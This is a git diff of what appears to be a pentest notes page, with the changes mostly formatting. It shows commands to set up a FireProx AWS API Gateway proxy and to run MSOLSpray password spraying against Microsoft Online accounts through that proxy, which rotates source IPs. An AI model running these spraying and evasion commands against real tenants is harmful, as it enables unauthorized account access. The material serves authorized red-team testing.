@@ -21,7 +21,7 @@ pip install -r requirements.txt
 python fire.py --access_key <AWS_KEY> --secret_access_key <AWS_SECRET> --region <REGION> --url <TARGET SITE> --command create
 ```
 
-### Destroy 
+### Destroy&#x20;
 
 * Once finished, delete the endpoint
 
@@ -34,22 +34,22 @@ pi_id <API ID>  --command destroy
 
 * Create an endpoint using fireprox
 
-![](../../.gitbook/assets/image%20%2881%29.png)
+![](<../../.gitbook/assets/image (81).png>)
 
 * Create an user list
 
-![](../../.gitbook/assets/image%20%28295%29.png)
+![](<../../.gitbook/assets/image (295).png>)
 
 * Load MSOLSpray module and execute it using the userlist, a password and the proxy url :
 
-```text
+```
 Import-Module .\MSOLSpray.ps1
 Invoke-MSOLSpray -UserList .\userlist.txt -Password WrongPass123 -URL https://llm9mzll40.execute-api.eu-west-1.amazonaws.com/fireprox/
 ```
 
-![](../../.gitbook/assets/image%20%28308%29.png)
+![](<../../.gitbook/assets/image (308).png>)
 
-* cleanup ****
+* cleanup&#x20;
 
 ```csharp
 python fire.py --access_key $AWS --secret_access_key $KEY --region eu-west-1 --api_id  llm9mzll40 --command destroy
@@ -62,4 +62,3 @@ python fire.py --access_key $AWS --secret_access_key $KEY --region eu-west-1 --a
 ## ProxyCannon-NG
 
 {% embed url="https://github.com/proxycannon/proxycannon-ng" %}
-
